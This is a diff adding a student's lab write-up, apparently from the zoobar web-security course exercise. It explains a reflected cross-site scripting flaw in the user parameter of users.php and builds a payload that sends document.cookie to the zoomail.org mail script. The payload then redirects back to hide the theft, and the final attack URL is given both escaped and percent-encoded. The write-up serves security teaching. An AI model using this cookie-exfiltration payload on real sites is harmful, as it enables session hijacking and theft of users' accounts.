@@ -1,0 +1,36 @@
+Attack A
+
+The goal of this exploit was to craft a url that would utilize the zoomail.org email script in order to
+mail a user's cookie to ourselves.  This is exploitable because the code after the user variable in the 
+url gets inserted into the HTML as the value for user.  First it is necessary to end the value variable
+with an endquote ".  Then it is necessary to end the input element with a >.  After this, you can insert
+any javascript you want starting with the <script> tag.  For example, the provided starting point url 
+turns this:
+<input type="text" name="user" value="" size=10>
+Into this:
+<input type="text" name="user" value=""><script>alert(document.cookie);</script>" size=10>
+
+Knowing this allows us to insert javascript that then gets exectued by the page.
+Instead of displaying the cookie information though, we wanted to convince the webpage to invoke the
+zoomail.org script and e-mail the cookie to ourselves.  In order to this this, we had to create a 
+javascript image element with the src element set to a url in the format specified by zoomail.org.  We
+wanted the payload of the email to be the cookie associated with the zoobar webpage which can be accessed
+as "document.cookie".
+
+<script>
+new Image().src='http://zoomail.org/sendmail.php?netid=pmcollins2&payload='+document.cookie+'&random='+Math.random();
+</script>
+
+This would successfully e-mail us the cookie but would cause "size=10>" to be displayed between the
+entry box and view button.  It would also cause a red error message to appear.  In order to get around
+this, after e-mailing the cookie we then wanted to switch back to the original webpage.  We did this using
+the document.location property in javascript.  
+
+document.location='/users.php';
+
+The final piece was to encode the punctuation in the URL where necessary (: / < > etc).
+
+http://zoobar.org/users.php?user=\"\>\<script\>new\ Image().src\=\'http\:\/\/zoomail.org\/sendmail.php\?netid\=pmcollins2\&payload\=\'\+document.cookie\+\'\&random\=\'\+Math.random()\;document.location\=\'\/users.php\'\;\<\/script\>
+
+http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Enew\%20Image().src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3Fnetid\%3Dpmcollins2\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random()\%3Bdocument.location\%3D\%27\%2Fusers.php\%27\%3B\%3C\%2Fscript\%3E
+
